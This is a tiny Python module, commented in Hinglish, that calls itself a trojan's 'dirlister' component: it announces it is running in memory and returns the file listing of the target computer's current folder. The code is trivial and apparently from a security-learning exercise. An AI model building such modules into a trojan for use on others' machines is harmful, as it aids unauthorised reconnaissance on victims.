import os

def run(**args):
    print("[*] Trojan ka dirlister module successfully RAM mein chal gaya hai!")
    # Yeh target computer ke maujooda folder ki files ki list return karega
    return str(os.listdir("."))
